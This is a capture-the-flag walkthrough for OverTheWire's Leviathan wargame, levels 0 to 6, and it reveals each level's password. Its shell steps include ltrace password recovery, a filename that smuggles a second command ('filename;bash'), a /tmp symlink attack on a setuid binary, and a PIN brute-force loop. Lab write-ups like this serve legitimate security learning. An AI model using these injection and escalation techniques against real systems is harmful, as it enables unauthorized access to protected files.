# Leviathan

## Level 0

* Goal: To login to the first level use Username: leviathan0, Password: leviathan0. Data for the levels can be found in the homedirectories. You can look at /etc/leviathan_pass for the various level passwords.

* Commands: ssh

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan0

ls

ls -a
#shows hidden .backup directory

cd .backup/

ls

cat bookmarks.html

cat bookmarks.html | grep password
#password (rioGegei8m)

exit
```

## Level 1

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan1

ls -a
#shows file called check

file check
#binary

./check
#asks password, tried previous password but doesn't work

strings check
#strings prints readable strings
#shows particular strings

ltrace ./check
#run a command until exits
#to understand logic used
#binary compares string with "sex"
#entering "sex" as password for binary

./check
#opens /bin/sh

whoami
#leviathan2

cat /etc/leviathan_pass/leviathan2
#password (ougahZi8Ta)

exit

exit
```

## Level 2

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan2

ls -a
#shows that printfile is owned by leviathan3

file printfile
#shows binary file

./printfile
#shows command to print a file

ldd printfile
#prints shared libraries

man readelf
#tool to display info for ELF files

readelf -h printfile

ltrace ./printfile /etc/leviathan_pass/leviathan3
#shows access function in code, exits

ltrace ./printfile /etc/passwd
#this works and we get access
#it tries to run /bin/cat for filename

mktemp -d
#create random directory in /tmp

cd /tmp/tmp.xRVgCgdIfr

touch 'filename;bash'
#creating file with a name containing semicolon, following which we place command to be executed

ls

~/printfile 'filename;bash'
#run printfile (in home directory) to print 'filename;bash'
#this executes bash command
#now we enter bash with leviathan3

whoami
#leviathan3

cat /etc/leviathan_pass/leviathan3
#password (Ahdiemoo1j)

exit

exit
```

## Level 3

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan3

ls -la
#shows binary named level3 with leviathan4 user

file level3

./level3
#gives prompt to enter password

ltrace ./level3
#shows strcmp function
#string compared with 'snlprintf'

ltrace ./level3
#enter snlprintf
#takes to shell

whoami
#leviathan3

ls
#shows level3

./level3
#enter password 'snlprintf' again
#takes us to another shell

whoami
#leviathan4

cat /etc/leviathan_pass/leviathan4
#password (vuH0coox6m)

exit

exit
#back to leviathan3

exit
```

## Level 4

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan4

ls -la
#shows a hidden directory called trash

cd .trash/

ls -la
#shows file called bin with leviathan5 as owner

file bin
#binary

./bin
#gives output in binary
#convert binary to ascii using online tool
#password (Tith4cokei)

exit
```

## Level 5

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan5

ls -la
#shows file named leviathan5, owned by leviathan6

file leviathan5
#binary file

./leviathan5
#cannot find /tmp/file.log

ltrace ./leviathan5
#it tries to open /tmp/file.log
#cannot find /tmp/file.log

less leviathan5

strings leviathan5

touch /tmp/file.log
#tried to create a file

ltrace ./leviathan5
#code runs and it prints content inside /tmp/file.log
#then it deletes /tmp/file.log

ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
#creates a symbolic link such that /tmp/file.log links to the password for leviathan6

./leviathan5
#gives content of /tmp/file.log, which leads to password file
#password (UgaoFee4li)

exit
```

## Level 6

* Solution -

```shell
ssh leviathan.labs.overthewire.org -p 2223 -l leviathan6

ls -la
#shows file called leviathan6, owned by leviathan7

file leviathan6

./leviathan6
#shows usage as ./leviathan6 <4 digit code>

./leviathan6 1234
#wrong

mktemp -d

cp leviathan6 /tmp/tmp.wRugDxnPkk

cd /tmp/tmp.wRugDxnPkk

touch trial.sh

chmod 777 trial.sh

vim trial.sh
: '
#!/bin/bash

for value in {9999..1000}
do
    ./leviathan6 $value
    echo $value
done
'

./trial.sh
#this will brute-force the process but takes some time
#process stops at a particular number

./leviathan6 7123
#takes us to a shell

whoami
#leviathan6, so we will need to exit and go to home directory

exit

cd ~

./leviathan6 7123
#takes us to shell

whoami
#leviathan7

cat /etc/leviathan_pass/leviathan7
#password (ahy7MaeBo9)

exit

exit
```
